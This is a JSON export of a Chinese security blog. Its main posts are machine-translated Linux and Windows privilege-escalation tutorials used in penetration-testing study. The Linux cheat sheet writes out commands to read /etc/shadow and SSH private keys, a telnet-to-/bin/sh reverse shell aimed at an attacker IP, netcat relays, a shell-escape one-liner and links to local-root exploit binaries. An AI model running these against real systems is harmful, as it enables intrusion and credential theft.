{"meta":{"title":"Misaki's Blog","subtitle":null,"description":"One way to choose one","author":"Misaki","url":""},"pages":[{"title":"Me","date":"2018-09-18T03:14:22.000Z","updated":"2019-01-30T08:08:54.381Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"关于我Web安全爱好者，python级菜鸟，移动安全进行中，喜欢一些新事物，成功性随机。"},{"title":"资料收集","date":"2018-09-20T03:19:11.000Z","updated":"2019-01-30T08:55:14.217Z","comments":true,"path":"data/index.html","permalink":"/data/index.html","excerpt":"","text":"SSRF SSRF漏洞的利用与学习 SSRF攻击实例解析 SSRF漏洞的挖掘经验 XXE XML实体注入漏洞攻与防 浅谈XXE漏洞攻击与防御 Java XXE Vulnerability SSTI 服务端模板注入攻击 Python 模板字符串与模板注入 Exploring SSTI in Flask/Jinja2 XSS 再谈同源策略 跨站的艺术 Browser’s XSS Filter Bypass Cheat Sheet XSS Filter Evasion Cheat Sheet 中文版 SQL SQL注入总结 MSSQL 注入攻击与防御 SQL注入测试技巧TIP 逻辑漏洞 Web安全测试中常见逻辑漏洞解析 未授权访问漏洞的检测与利用 任意用户密码重置（一）：重置凭证泄漏 任意用户密码重置（二）：重置凭证接收端可篡改 任意用户密码重置（三）：用户混淆 任意用户密码重置（四）：重置凭证未校验 任意用户密码重置（五）：重置凭证可暴破 任意用户密码重置（六）：应答中存在影响后续逻辑的状态参数 任意用户密码重置（七）：Token可预测 Web安全测试学习手册-业务逻辑测试 二维码登陆的常见缺陷剖析 渗透测试 Web渗透测试笔记 记一次对某企业的渗透测试实战 渗透测试工具备忘录 API 接口渗透测试 cobalt strike 快速上手 ThinkPHP-漏洞分析集合 RirchFaces反序列化漏洞 系统入侵与远程控制 内网渗透 内网渗透中转发工具总结 Cobalt strike在内网渗透中的使用 windows内网渗透杂谈 Linux 下多种反弹 shell 方法 穿越边界的姿势 Linux内网渗透"}],"posts":[{"title":"论文","slug":"论文","date":"2019-03-28T05:55:55.000Z","updated":"2019-03-28T05:56:12.220Z","comments":true,"path":"2019/03/论文/","link":"","permalink":"/2019/03/论文/","excerpt":"","text":"分享内容：推荐大家一个靠谱的论文检测平台。重复的部分有详细出处以及具体修改意见，能直接在文章上做修改，全部改完一键下载就搞定了。怕麻烦的话，还能用它自带的降重功能。哦对了，他们现在正在做毕业季活动， 赠送很多免费字数，可以说是十分划算了！地址是：http://www.paperpass.com/","categories":[],"tags":[]},{"title":"基本Linux权限提升","slug":"基本Linux权限提升","date":"2019-03-18T05:49:53.000Z","updated":"2019-03-18T05:50:20.054Z","comments":true,"path":"2019/03/基本Linux权限提升/","link":"","permalink":"/2019/03/基本Linux权限提升/","excerpt":"","text":"原文链接：https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 基本Linux权限提升枚举是关键。（Linux）权限升级就是： 收集 - *枚举，更多枚举和更多枚举。* 流程 - 对数据进行排序，分析和确定优先级。 搜索 - 了解要搜索的内容以及在何处查找漏洞利用代码。 适应 - *自定义漏洞利用，因此适合。并非每个漏洞利用都适用于每个系统“开箱即用”。* 尝试 - 为（大量）试验和错误做好准备。 操作系统什么是分销类型？什么版本？cat /etc/issue cat /etc/*-release cat /etc/lsb-release # Debian based cat /etc/redhat-release # Redhat based 什么是内核版本？是64位吗？cat /proc/version uname -a uname -mrs rpm -q kernel dmesg | grep Linux ls /boot | grep vmlinuz- 从环境变量中可以学到什么？cat /etc/profile cat /etc/bashrc cat ~/.bash_profile cat ~/.bashrc cat ~/.bash_logout env set 有打印机吗？lpstat -a 应用与服务正在运行什么服务？哪个服务具有哪个用户权限？ps aux ps -ef top cat /etc/services root运行了哪些服务？在这些易受攻击的服务中，值得仔细检查！ps aux | grep root ps -ef | grep root 安装了哪些应用程序？它们是什么版本的？他们目前正在运行吗？ls -alh /usr/bin/ ls -alh /sbin/ dpkg -l rpm -qa ls -alh /var/cache/apt/archivesO ls -alh /var/cache/yum/ 任何服务设置配置错误？是否附加了任何（易受攻击的）插件？cat /etc/syslog.conf cat /etc/chttp.conf cat /etc/lighttpd.conf cat /etc/cups/cupsd.conf cat /etc/inetd.conf cat /etc/apache2/apache2.conf cat /etc/my.conf cat /etc/httpd/conf/httpd.conf cat /opt/lampp/etc/httpd.conf ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/ 安排了哪些工作？crontab -l ls -alh /var/spool/cron ls -al /etc/ | grep cron ls -al /etc/cron* cat /etc/cron* cat /etc/at.allow cat /etc/at.deny cat /etc/cron.allow cat /etc/cron.deny cat /etc/crontab cat /etc/anacrontab cat /var/spool/cron/crontabs/root 任何纯文本用户名和/或密码？grep -i user [filename] grep -i pass [filename] grep -C 5 &quot;password&quot; [filename] find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla 通信与网络系统有哪些NIC？它是否连接到另一个网络？/sbin/ifconfig -a cat /etc/network/interfaces cat /etc/sysconfig/network 什么是网络配置设置？你能从这个网络中找到什么？DHCP服务器？DNS服务器？网关？cat /etc/resolv.conf cat /etc/sysconfig/network cat /etc/networks iptables -L hostname dnsdomainname 其他用户和主机与系统进行通信的是什么？lsof -i lsof -i :80 grep 80 /etc/services netstat -antup netstat -antpx netstat -tulpn chkconfig --list chkconfig --list | grep 3:on last w 什么缓存？IP和/或MAC地址arp -e route /sbin/route -nee 数据包嗅探可能吗？可以看到什么tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 注意：tcpdump tcp dst [ip] [port]和tcp dst [ip] [port] 你有壳吗？你能和系统互动吗？nc -lvp 4444 # Attacker. Input (Commands) nc -lvp 4445 # Attacker. Ouput (Results) telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # On the targets system. Use the attackers IP! ` 注意：http：//lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ 端口转发可能吗？重定向并与来自其他视图的流量进行交互注意：http：//www.boutell.com/rinetd/ 注意：http：//www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch 注意：http：//downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip 注意：FPipe.exe -l [本地端口] -r [远程端口] -s [本地端口] [本地IP] FPipe.exe -l 80 -r 80 -s 80 192.168.1.7 注意：ssh - [L / R] [本地端口]：[远程ip]：[远程端口] [本地用户] @ [本地ip] ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port 注意：mknod backpipe p; nc -l -p [远程端口] 反向管道 mknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.5.5.151 80 &gt;backpipe # Port Relay mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080) mknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080) 隧道可能吗？远程本地发送命令ssh -D 127.0.0.1:9050 -N [username]@[ip] proxychains ifconfig 机密信息和用户你是谁？谁登录？谁已登录？那里还有谁？谁能做什么？id who w last cat /etc/passwd | cut -d: -f1 # List of users grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39; # List of super users awk -F: &#39;($3 == &quot;0&quot;) {print}&#39; /etc/passwd # List of super users cat /etc/sudoers sudo -l 可以找到哪些敏感文件？cat /etc/passwd cat /etc/group cat /etc/shadow ls -alh /var/mail/ 家庭导演中有什么“有趣”的东西？如果可以访问ls -ahlR /root/ ls -ahlR /home/ 是否有密码; 脚本，数据库，配置文件或日志文件？密码的默认路径和位置cat /var/apache2/config.inc cat /var/lib/mysql/mysql/user.MYD cat /root/anaconda-ks.cfg 用户正在做什么？是否有明文密码？他们在编辑什么？cat ~/.bash_history cat ~/.nano_history cat ~/.atftp_history cat ~/.mysql_history cat ~/.php_history 可以找到哪些用户信息？cat ~/.bashrc cat ~/.profile cat /var/mail/root cat /var/spool/mail/root 可以找到私钥信息吗？cat ~/.ssh/authorized_keys cat ~/.ssh/identity.pub cat ~/.ssh/identity cat ~/.ssh/id_rsa.pub cat ~/.ssh/id_rsa cat ~/.ssh/id_dsa.pub cat ~/.ssh/id_dsa cat /etc/ssh/ssh_config cat /etc/ssh/sshd_config cat /etc/ssh/ssh_host_dsa_key.pub cat /etc/ssh/ssh_host_dsa_key cat /etc/ssh/ssh_host_rsa_key.pub cat /etc/ssh/ssh_host_rsa_key cat /etc/ssh/ssh_host_key.pub cat /etc/ssh/ssh_host_key ` 文件系统哪些配置文件可以写在/ etc /中？能够重新配置服务吗？ls -aRl /etc/ | awk &#39;$1 ~ /^.*w.*/&#39; 2&gt;/dev/null # Anyone ls -aRl /etc/ | awk &#39;$1 ~ /^..w/&#39; 2&gt;/dev/null # Owner ls -aRl /etc/ | awk &#39;$1 ~ /^.....w/&#39; 2&gt;/dev/null # Group ls -aRl /etc/ | awk &#39;$1 ~ /w.$/&#39; 2&gt;/dev/null # Other find /etc/ -readable -type f 2&gt;/dev/null # Anyone find /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone ` 在/ var /中可以找到什么？ls -alh /var/log ls -alh /var/mail ls -alh /var/spool ls -alh /var/spool/lpd ls -alh /var/lib/pgsql ls -alh /var/lib/mysql cat /var/lib/dhcp3/dhclient.leases 网站上的任何设置/文件（隐藏）？有数据库信息的任何设置文件？ls -alhR /var/www/ ls -alhR /srv/www/htdocs/ ls -alhR /usr/local/www/apache22/data/ ls -alhR /opt/lampp/htdocs/ ls -alhR /var/www/html/ 日志文件中是否有任何内容（可以帮助“本地文件包含”！） cat /etc/httpd/logs/access_log cat /etc/httpd/logs/access.log cat /etc/httpd/logs/error_log cat /etc/httpd/logs/error.log cat /var/log/apache2/access_log cat /var/log/apache2/access.log cat /var/log/apache2/error_log cat /var/log/apache2/error.log cat /var/log/apache/access_log cat /var/log/apache/access.log cat /var/log/auth.log cat /var/log/chttp.log cat /var/log/cups/error_log cat /var/log/dpkg.log cat /var/log/faillog cat /var/log/httpd/access_log cat /var/log/httpd/access.log cat /var/log/httpd/error_log cat /var/log/httpd/error.log cat /var/log/lastlog cat /var/log/lighttpd/access.log cat /var/log/lighttpd/error.log cat /var/log/lighttpd/lighttpd.access.log cat /var/log/lighttpd/lighttpd.error.log cat /var/log/messages cat /var/log/secure cat /var/log/syslog cat /var/log/wtmp cat /var/log/xferlog cat /var/log/yum.log cat /var/run/utmp cat /var/webmin/miniserv.log cat /var/www/logs/access_log cat /var/www/logs/access.log ls -alh /var/lib/dhcp3/ ls -alh /var/log/postgresql/ ls -alh /var/log/proftpd/ ls -alh /var/log/samba/ Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp ` 注：http：//www.thegeekstuff.com/2011/08/linux-var-log-files/ 如果命令有限，你会打破“监狱”外壳？python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39; echo os.system(&#39;/bin/bash&#39;) /bin/sh -i 如何安装文件系统？mount df -h 是否有任何未安装的文件系统？cat /etc/fstab 使用了什么“高级Linux文件权限”？find / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here. find / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it. find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it. find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUID for i in `locate -r &quot;bin$&quot;`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;/dev/null; done # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search) # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied) find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;/dev/null 哪里可以写入和执行？一些常见的地方：/ tmp，/ var / tmp，/ dev / shmfind / -writable -type d 2&gt;/dev/null # world-writeable folders find / -perm -222 -type d 2&gt;/dev/null # world-writeable folders find / -perm -o w -type d 2&gt;/dev/null # world-writeable folders find / -perm -o x -type d 2&gt;/dev/null # world-executable folders find / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null # world-writeable &amp; executable folders 任何“问题”文件？可写字，“无人”文件find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print # world-writeable files find /dir -xdev \\( -nouser -o -nogroup \\) -print # Noowner files 准备和寻找利用代码安装/支持哪些开发工具/语言？find / -name perl* find / -name python* find / -name gcc* find / -name cc 如何上传文件？find / -name wget find / -name nc* find / -name netcat* find / -name tftp* find / -name ftp 查找漏洞利用代码http://www.exploit-db.com http://1337day.com http://www.securiteam.com http://www.securityfocus.com http://www.exploitsearch.net http://metasploit.com/modules/ http://securityreason.com http://seclists.org/fulldisclosure/ http://www.google.com 查找有关该漏洞利用的更多信息http://www.cvedetails.com http://packetstormsecurity.org/files/cve/[CVE] http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE] http://www.vulnview.com/cve-details.php?cvename=[CVE] （快速）“常见”漏洞。警告。预编译的二进制文件。使用风险由您自己承担http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/ http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/ 缓解措施上述任何信息都很容易找到吗？试试吧！设置一个自动执行脚本和/或第三方产品的cron作业 系统是否完全打补丁？内核，操作系统，所有应用程序，插件和Web服务 apt-get update &amp;&amp; apt-get upgrade yum update 服务是否以最低权限级别运行？例如，您是否需要以root身份运行MySQL？ 脚本任何一个都可以自动化吗？！http://pentestmonkey.net/tools/unix-privesc-check/ http://labs.portcullis.co.uk/application/enum4linux/ http://bastille-linux.sourceforge.net","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"Windows权限提升基础","slug":"Windows权限提升基础","date":"2019-03-18T05:29:26.000Z","updated":"2019-03-18T06:09:23.282Z","comments":true,"path":"2019/03/Windows权限提升基础/","link":"","permalink":"/2019/03/Windows权限提升基础/","excerpt":"","text":"原文链接：http://www.fuzzysecurity.com/tutorials/16.html Windows权限提升基础没有多少人谈论严重的Windows权限升级，这是一种耻辱。我认为造成这种情况的原因可能是（1）在测试时，低版权的外壳通常都是客户需要的证据，（2）在分阶段的环境中，你经常会弹出管理员账号，（3）米预测让你懒惰（getsystem = lazy-fu），（4）构建评论经常最终成为 - &gt;认证nessus scan，microsoft security baseline analyzer … 与常见的看法相反，如果配置小心，Windows机箱可以很好地锁定。最重要的是，补丁时间窗口机会很小。因此，让我们深入了解Windows操作系统的黑暗角落，看看我们是否可以获得SYSTEM。 应该注意的是，我将使用各种版本的Windows来突出显示可能存在的任何命令行差异。请记住这一点，因为在不存在的命令或产生稍微不同的输出方面可能存在各种OS / SP差异。我已经尝试构建本教程，因此它将以最常用的方式应用于Windows权限提升。 最后，我想向我的朋友Kostas大声喊叫，他也非常喜欢后期开发，你真的不希望他登录你的机器。 不可或缺的资源：Windows Privilege Escalation百科全书（Brett Moore） - 这里。Windows攻击：AT是新黑人（Chris Gates＆Rob Fuller） - 这里。通过利用弱文件夹权限提升权限（Parvez Anwar） - 这里。 Δt for t0 to t3 - 初始信息收集 本教程的起点是一个盒子上没有特权的shell。我们可能使用了远程攻击或客户端攻击，我们得到了一个shell。基本上在时间t0，我们不了解机器，它做什么，它连接到什么，我们有什么级别的特权，甚至是什么操作系统。 最初，我们希望快速收集一些基本信息，以便我们可以获得一块土地并评估我们的情况。 首先让我们找出我们连接的操作系统： C:\\Windows\\system32&gt; systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; OS Name: Microsoft Windows 7 Professional OS Version: 6.1.7601 Service Pack 1 Build 7601 接下来，我们将看到框的主机名是什么以及我们连接的用户是什么。 C:\\Windows\\system32&gt; hostname b33f C:\\Windows\\system32&gt; echo %username% user1 现在我们有了这个基本信息，我们在框中列出了其他用户帐户，并更详细地查看了我们自己的用户信息。我们已经可以看到user1不是本地组管理员的一部分。 C:\\Windows\\system32&gt; net users User accounts for \\\\B33F ------------------------------------------------------------------------------- Administrator b33f Guest user1 The command completed successfully. C:\\Windows\\system32&gt; net user user1 User name user1 Full Name Comment User&#39;s comment Country code 000 (System Default) Account active Yes Account expires Never Password last set 1/11/2014 7:47:14 PM Password expires Never Password changeable 1/11/2014 7:47:14 PM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 1/11/2014 8:05:09 PM Logon hours allowed All Local Group Memberships *Users Global Group memberships *None The command completed successfully. 这就是我们目前需要了解的用户和权限。我们列表中的下一步是网络，连接到的机器是什么以及它对这些连接施加了什么规则。 首先让我们看一下可用的网络接口和路由表。 C:\\Windows\\system32&gt; ipconfig /all Windows IP Configuration Host Name . . . . . . . . . . . . : b33f Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No Ethernet adapter Bluetooth Network Connection: Media State . . . . . . . . . . . : Media disconnected Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Bluetooth Device (Personal Area Network) Physical Address. . . . . . . . . : 0C-84-DC-62-60-29 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection Physical Address. . . . . . . . . : 00-0C-29-56-79-35 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::5cd4:9caf:61c0:ba6e%11(Preferred) IPv4 Address. . . . . . . . . . . : 192.168.0.104(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.0 Lease Obtained. . . . . . . . . . : Saturday, January 11, 2014 3:53:55 PM Lease Expires . . . . . . . . . . : Sunday, January 12, 2014 3:53:55 PM Default Gateway . . . . . . . . . : 192.168.0.1 DHCP Server . . . . . . . . . . . : 192.168.0.1 DHCPv6 IAID . . . . . . . . . . . : 234884137 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-18-14-24-1D-00-0C-29-56-79-35 DNS Servers . . . . . . . . . . . : 192.168.0.1 NetBIOS over Tcpip. . . . . . . . : Enabled C:\\Windows\\system32&gt; route print =========================================================================== Interface List 18...0c 84 dc 62 60 29 ......Bluetooth Device (Personal Area Network) 13...00 ff 0c 0d 4f ed ......TAP-Windows Adapter V9 11...00 0c 29 56 79 35 ......Intel(R) PRO/1000 MT Network Connection 1...........................Software Loopback Interface 1 16...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter 15...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #2 19...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter #3 14...00 00 00 00 00 00 00 e0 Teredo Tunneling Pseudo-Interface =========================================================================== IPv4 Route Table =========================================================================== Active Routes: Network Destination Netmask Gateway Interface Metric 0.0.0.0 0.0.0.0 192.168.0.1 192.168.0.104 10 127.0.0.0 255.0.0.0 On-link 127.0.0.1 306 127.0.0.1 255.255.255.255 On-link 127.0.0.1 306 127.255.255.255 255.255.255.255 On-link 127.0.0.1 306 192.168.0.0 255.255.255.0 On-link 192.168.0.104 266 192.168.0.104 255.255.255.255 On-link 192.168.0.104 266 192.168.0.255 255.255.255.255 On-link 192.168.0.104 266 224.0.0.0 240.0.0.0 On-link 127.0.0.1 306 224.0.0.0 240.0.0.0 On-link 192.168.0.104 266 255.255.255.255 255.255.255.255 On-link 127.0.0.1 306 255.255.255.255 255.255.255.255 On-link 192.168.0.104 266 =========================================================================== Persistent Routes: None IPv6 Route Table =========================================================================== Active Routes: If Metric Network Destination Gateway 14 58 ::/0 On-link 1 306 ::1/128 On-link 14 58 2001::/32 On-link 14 306 2001:0:5ef5:79fb:8d2:b4e:3f57:ff97/128 On-link 11 266 fe80::/64 On-link 14 306 fe80::/64 On-link 14 306 fe80::8d2:b4e:3f57:ff97/128 On-link 11 266 fe80::5cd4:9caf:61c0:ba6e/128 On-link 1 306 ff00::/8 On-link 14 306 ff00::/8 On-link 11 266 ff00::/8 On-link =========================================================================== Persistent Routes: None # arp -A displays the ARP (Address Resolution Protocol) cache table for all available interfaces. C:\\Windows\\system32&gt; arp -A Interface: 192.168.0.104 --- 0xb Internet Address Physical Address Type 192.168.0.1 90-94-e4-c5-b0-46 dynamic 192.168.0.101 ac-22-0b-af-bb-43 dynamic 192.168.0.255 ff-ff-ff-ff-ff-ff static 224.0.0.22 01-00-5e-00-00-16 static 224.0.0.251 01-00-5e-00-00-fb static 224.0.0.252 01-00-5e-00-00-fc static 239.255.255.250 01-00-5e-7f-ff-fa static 255.255.255.255 ff-ff-ff-ff-ff-ff static 这将我们带到活动网络连接和防火墙规则。 C:\\Windows\\system32&gt; netstat -ano Active Connections Proto Local Address Foreign Address State PID TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 684 TCP 0.0.0.0:445 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:5357 0.0.0.0:0 LISTENING 4 TCP 127.0.0.1:5354 0.0.0.0:0 LISTENING 1400 TCP 192.168.0.104:139 0.0.0.0:0 LISTENING 4 TCP [::]:135 [::]:0 LISTENING 684 TCP [::]:445 [::]:0 LISTENING 4 TCP [::]:5357 [::]:0 LISTENING 4 UDP 0.0.0.0:5355 *:* 1100 UDP 0.0.0.0:52282 *:* 976 UDP 0.0.0.0:55202 *:* 2956 UDP 0.0.0.0:59797 *:* 1400 UDP 127.0.0.1:1900 *:* 2956 UDP 127.0.0.1:65435 *:* 2956 UDP 192.168.0.104:137 *:* 4 UDP 192.168.0.104:138 *:* 4 UDP 192.168.0.104:1900 *:* 2956 UDP 192.168.0.104:5353 *:* 1400 UDP 192.168.0.104:65434 *:* 2956 UDP [::]:5355 *:* 1100 UDP [::]:52281 *:* 976 UDP [::]:52283 *:* 976 UDP [::]:55203 *:* 2956 UDP [::]:59798 *:* 1400 UDP [::1]:1900 *:* 2956 UDP [::1]:5353 *:* 1400 UDP [::1]:65433 *:* 2956 UDP [fe80::5cd4:9caf:61c0:ba6e%11]:1900 *:* 2956 UDP [fe80::5cd4:9caf:61c0:ba6e%11]:65432 *:* 2956 # The following two netsh commands are examples of commands that are not universal across OS/SP. The netsh firewall commands are only available from XP SP2 and upwards. C:\\Windows\\system32&gt; netsh firewall show state Firewall status: ------------------------------------------------------------------- Profile = Standard Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Group policy version = Windows Firewall Remote admin mode = Disable Ports currently open on all network interfaces: Port Protocol Version Program ------------------------------------------------------------------- No ports are currently open on all network interfaces. C:\\Windows\\system32&gt; netsh firewall show config Domain profile configuration: ------------------------------------------------------------------- Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Allowed programs configuration for Domain profile: Mode Traffic direction Name / Program ------------------------------------------------------------------- Port configuration for Domain profile: Port Protocol Mode Traffic direction Name ------------------------------------------------------------------- ICMP configuration for Domain profile: Mode Type Description ------------------------------------------------------------------- Enable 2 Allow outbound packet too big Standard profile configuration (current): ------------------------------------------------------------------- Operational mode = Enable Exception mode = Enable Multicast/broadcast response mode = Enable Notification mode = Enable Service configuration for Standard profile: Mode Customized Name ------------------------------------------------------------------- Enable No Network Discovery Allowed programs configuration for Standard profile: Mode Traffic direction Name / Program ------------------------------------------------------------------- Enable Inbound COMRaider / E:\\comraider\\comraider.exe Enable Inbound nc.exe / C:\\users\\b33f\\desktop\\nc.exe Port configuration for Standard profile: Port Protocol Mode Traffic direction Name ------------------------------------------------------------------- ICMP configuration for Standard profile: Mode Type Description ------------------------------------------------------------------- Enable 2 Allow outbound packet too big Log configuration: ------------------------------------------------------------------- File location = C:\\Windows\\system32\\LogFiles\\Firewall\\pfirewall.log Max file size = 4096 KB Dropped packets = Disable Connections = Disable 最后，我们将简要介绍受感染的盒子上运行的内容：计划任务，运行进程，已启动服务和已安装的驱动程序。 # This will display verbose output for all scheduled tasks, below you can see sample output for a single task. C:\\Windows\\system32&gt; schtasks /query /fo LIST /v Folder: \\Microsoft\\Windows Defender HostName: B33F TaskName: \\Microsoft\\Windows Defender\\MP Scheduled Scan Next Run Time: 1/22/2014 5:11:13 AM Status: Ready Logon Mode: Interactive/Background Last Run Time: N/A Last Result: 1 Author: N/A Task To Run: c:\\program files\\windows defender\\MpCmdRun.exe Scan -ScheduleJob -WinTask -RestrictPrivilegesScan Start In: N/A Comment: Scheduled Scan Scheduled Task State: Enabled Idle Time: Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes Power Management: No Start On Batteries Run As User: SYSTEM Delete Task If Not Rescheduled: Enabled Stop Task If Runs X Hours and X Mins: 72:00:00 Schedule: Scheduling data is not available in this format. Schedule Type: Daily Start Time: 5:11:13 AM Start Date: 1/1/2000 End Date: 1/1/2100 Days: Every 1 day(s) Months: N/A Repeat: Every: Disabled Repeat: Until: Time: Disabled Repeat: Until: Duration: Disabled Repeat: Stop If Still Running: Disabled [..Snip..] # The following command links running processes to started services. C:\\Windows\\system32&gt; tasklist /SVC Image Name PID Services ========================= ======== ============================================ System Idle Process 0 N/A System 4 N/A smss.exe 244 N/A csrss.exe 332 N/A csrss.exe 372 N/A wininit.exe 380 N/A winlogon.exe 428 N/A services.exe 476 N/A lsass.exe 484 SamSs lsm.exe 496 N/A svchost.exe 588 DcomLaunch, PlugPlay, Power svchost.exe 668 RpcEptMapper, RpcSs svchost.exe 760 Audiosrv, Dhcp, eventlog, HomeGroupProvider, lmhosts, wscsvc svchost.exe 800 AudioEndpointBuilder, CscService, Netman, SysMain, TrkWks, UxSms, WdiSystemHost, wudfsvc svchost.exe 836 AeLookupSvc, BITS, gpsvc, iphlpsvc, LanmanServer, MMCSS, ProfSvc, Schedule, seclogon, SENS, ShellHWDetection, Themes, Winmgmt, wuauserv audiodg.exe 916 N/A svchost.exe 992 EventSystem, fdPHost, netprofm, nsi, WdiServiceHost, WinHttpAutoProxySvc svchost.exe 1104 CryptSvc, Dnscache, LanmanWorkstation, NlaSvc spoolsv.exe 1244 Spooler svchost.exe 1272 BFE, DPS, MpsSvc mDNSResponder.exe 1400 Bonjour Service taskhost.exe 1504 N/A taskeng.exe 1556 N/A vmtoolsd.exe 1580 VMTools dwm.exe 1660 N/A explorer.exe 1668 N/A vmware-usbarbitrator.exe 1768 VMUSBArbService TPAutoConnSvc.exe 1712 TPAutoConnSvc [..Snip..] C:\\Windows\\system32&gt; net start These Windows services are started: Application Experience Application Information Background Intelligent Transfer Service Base Filtering Engine Bluetooth Support Service Bonjour Service COM+ Event System COM+ System Application Cryptographic Services DCOM Server Process Launcher Desktop Window Manager Session Manager DHCP Client Diagnostic Policy Service Diagnostic Service Host Diagnostic System Host Distributed Link Tracking Client Distributed Transaction Coordinator DNS Client Function Discovery Provider Host Function Discovery Resource Publication Group Policy Client [..Snip..] # This can be useful sometimes as some 3rd party drivers, even by reputable companies, contain more holes than Swiss cheese. This is only possible because ring0 exploitation lies outside most peoples expertise. C:\\Windows\\system32&gt; DRIVERQUERY Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 11/20/2010 6:01:11 PM ACPI Microsoft ACPI Driver Kernel 11/20/2010 4:37:52 PM AcpiPmi ACPI Power Meter Drive Kernel 11/20/2010 4:47:55 PM adp94xx adp94xx Kernel 12/6/2008 7:59:55 AM adpahci adpahci Kernel 5/2/2007 1:29:26 AM adpu320 adpu320 Kernel 2/28/2007 8:03:08 AM AFD Ancillary Function Dri Kernel 11/20/2010 4:40:00 PM agp440 Intel AGP Bus Filter Kernel 7/14/2009 7:25:36 AM aic78xx aic78xx Kernel 4/12/2006 8:20:11 AM aliide aliide Kernel 7/14/2009 7:11:17 AM amdagp AMD AGP Bus Filter Dri Kernel 7/14/2009 7:25:36 AM amdide amdide Kernel 7/14/2009 7:11:19 AM AmdK8 AMD K8 Processor Drive Kernel 7/14/2009 7:11:03 AM AmdPPM AMD Processor Driver Kernel 7/14/2009 7:11:03 AM amdsata amdsata Kernel 3/19/2010 9:08:27 AM amdsbs amdsbs Kernel 3/21/2009 2:35:26 AM amdxata amdxata Kernel 3/20/2010 12:19:01 AM AppID AppID Driver Kernel 11/20/2010 5:29:48 PM arc arc Kernel 5/25/2007 5:31:06 AM [..Snip..] Δt for t4 - WMIC的奥术艺术 我想分别提到WMIC（Windows Management Instrumentation命令行），因为它是Windows最有用的命令行工具。WIMIC对于信息收集和后期开发非常实用。据说它有点笨重，输出还有很多不足之处。 完全解释WMIC的使用将采用它自己的全部教程。更不用说由于格式化，一些输出将难以显示。 我在下面列出了两个非常值得阅读的资源：Command-Line Ninjitsu（SynJunkie） - 这里是Windows WMIC命令行（ComputerHope） - 这里 不幸的是，除非用户在Administrators组中，否则某些Windows默认配置不允许访问WMIC（这可能是一个非常好的主意）。从我对VM的测试中我注意到，任何版本的XP都不允许从低权限帐户访问WMIC。相反，Windows 7 Professional和Windows 8 Enterprise的默认安装允许低权限用户使用WMIC并查询操作系统而无需修改任何设置。这正是我们使用WMIC收集有关目标机器的信息所需要的。 为了让您了解WMIC提供的广泛选项，我已在下面列出了可用的命令行开关。 C:\\Windows\\system32&gt; wmic /? [global switches] The following global switches are available: /NAMESPACE Path for the namespace the alias operate against. /ROLE Path for the role containing the alias definitions. /NODE Servers the alias will operate against. /IMPLEVEL Client impersonation level. 